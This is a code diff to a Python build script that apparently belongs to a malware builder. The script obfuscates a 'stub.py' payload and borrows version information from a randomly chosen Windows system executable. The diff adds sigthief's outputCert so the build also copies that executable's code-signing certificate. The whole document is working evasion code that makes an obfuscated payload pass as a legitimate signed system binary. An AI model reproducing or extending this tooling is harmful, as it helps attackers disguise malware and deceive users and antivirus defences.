@@ -6,6 +6,7 @@ import subprocess
 import random
 
 import BlankOBF as obfuscator
+from sigthief import outputCert
 
 SettingsFile = "config.json"
 InCodeFile = "stub.py"
@@ -67,7 +68,7 @@ def EncryptString(plainText: str) -> str:
     encoded = base64.b64encode(plainText.encode()).decode()
     return "base64.b64decode(\"{}\").decode()".format(encoded)
 
-def MakeVersionFile() -> None:
+def MakeVersionFileAndCert() -> None:
     original: str
     retries = 0
     exeFiles = []
@@ -77,8 +78,8 @@ def MakeVersionFile() -> None:
         os.path.join(os.getenv("SystemRoot"), "sysWOW64")
     ]
 
-    with open("version.txt") as file:
-        original = file.read()
+    with open("version.txt") as exefile:
+        original = exefile.read()
 
     for path in paths:
         if os.path.isdir(path):
@@ -86,8 +87,8 @@ def MakeVersionFile() -> None:
 
     if exeFiles:
         while(retries < 5):
-            file = random.choice(exeFiles)
-            res = subprocess.run('pyi-grab_version "{}" version.txt'.format(file), shell= True, capture_output= True)
+            exefile = random.choice(exeFiles)
+            res = subprocess.run('pyi-grab_version "{}" version.txt'.format(exefile), shell= True, capture_output= True)
             if res.returncode != 0:
                 retries += 1
             else:
@@ -97,11 +98,12 @@ def MakeVersionFile() -> None:
                     retries += 1
                     continue
                 else:
+                    outputCert(exefile, "cert")
                     break
 
         if retries >= 5:
-            with open("version.txt", "w") as file:
-                file.write(original)
+            with open("version.txt", "w") as exefile:
+                exefile.write(original)
 
 def main() -> None:
     with open(InCodeFile) as file:
@@ -110,7 +112,7 @@ def main() -> None:
     code = WriteSettings(code, *ReadSettings())
 
     obfuscator.BlankOBF(code, OutCodeFile)
-    MakeVersionFile()
+    MakeVersionFileAndCert()
 
 if __name__ == "__main__":
     main()
